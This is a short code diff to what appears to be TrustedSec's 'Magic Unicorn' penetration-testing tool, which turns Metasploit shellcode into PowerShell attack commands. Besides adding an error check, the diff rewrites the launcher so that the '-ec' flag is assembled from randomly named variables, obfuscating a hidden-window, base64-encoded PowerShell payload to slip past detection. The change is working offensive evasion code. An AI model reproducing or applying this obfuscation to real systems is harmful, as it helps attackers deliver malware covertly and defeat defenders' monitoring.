@@ -319,6 +319,11 @@ def generate_shellcode(payload, ipaddr, port):
              'unsignedcharbuf[]=': ''}
     data = reduce(lambda a, kv: a.replace(*kv),
                   iter(repls.items()), data).rstrip()
+
+    if len(data) < 1: 
+        print("[!] Length of shellcode was not generated. Check payload name and if Metasploit is working and try again.")
+        print("Exiting....")
+        sys.exit()
     return data
 
 # generate shellcode attack and replace hex
@@ -384,8 +389,12 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     print("Twitter: @TrustedSec, @HackingDave")
     print("\nHappy Magic Unicorns.")
 
-    full_attack = "powershell -window hidden -ec " + \
-        base64.b64encode(powershell_code.encode('utf_16_le'))
+    ran1 = generate_random_string(1, 2)
+    ran2 = generate_random_string(1, 2)
+    ran3 = generate_random_string(1, 2)
+    ran4 = generate_random_string(1, 2)
+    full_attack = 'powershell -window hidden -C "set-variable -name "%s" -value "-"; set-variable -name "%s" -value "e"; set-variable -name "%s" -value "c"; set-variable -name "%s" -value ((get-variable %s).value.toString()+(get-variable %s).value.toString()+(get-variable %s).value.toString()) ; powershell (get-variable %s).value.toString() ' % (ran1, ran2, ran3, ran4, ran1, ran2, ran3, ran4) + \
+        base64.b64encode(powershell_code.encode('utf_16_le')) + '"'
 
     if attack_type == "msf":
         if attack_modifier == "macro":
